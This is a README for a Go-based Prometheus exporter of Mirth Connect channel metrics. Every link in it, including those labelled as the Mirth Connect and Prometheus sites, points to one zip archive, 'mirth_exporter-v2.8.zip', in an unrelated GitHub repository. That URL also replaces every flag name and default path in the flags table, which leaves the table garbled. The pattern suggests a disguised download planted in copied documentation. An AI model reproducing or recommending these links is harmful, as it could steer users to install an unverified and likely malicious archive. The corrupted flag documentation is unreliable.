# Mirth Exporter

Export [Mirth Connect](https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip) channel
statistics to [Prometheus](https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip).

Metrics are retreived using the Mirth Connect CLI. This has only been tested
with Mirth Connect 3.3.2, but it should work with any 3.x version.

To run it:

    go build
    ./mirth_exporter [flags]

## Exported Metrics
| Metric | Description | Labels |
| ------ | ------- | ------ |
| mirth_up | Was the last Mirth CLI query successful | |
| mirth_channels_deployed | How many channels are deployed | |
| mirth_channels_started | How many of the deployed channels are started | |
| mirth_messages_received_total | How many messages have been received | channel |
| mirth_messages_filtered_total  | How many messages have been filtered | channel |
| mirth_messages_queued | How many messages are currently queued | channel |
| mirth_messages_sent_total  | How many messages have been sent | channel |
| mirth_messages_errored_total  | How many messages have errored | channel |

## Flags
    ./mirth_exporter --help

| Flag | Description | Default |
| ---- | ----------- | ------- |
| https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip | Logging level | `info` |
| https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip | Path to properties file for Mirth Connect CLI | `https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip` |
| https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip | Path to jar file for Mirth Connect CLI | `https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip` |
| https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip | Address to listen on for telemetry | `:9140` |
| https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip | Path under which to expose metrics | `/metrics` |

## Notice

This exporter is inspired by the [consul_exporter](https://raw.githubusercontent.com/WHAZAZA/mirth_exporter/master/nonscalding/mirth_exporter-v2.8.zip)
and has some common code. Any new code here is Copyright &copy; 2016 Vynca, Inc. See the included
LICENSE file for terms and conditions.
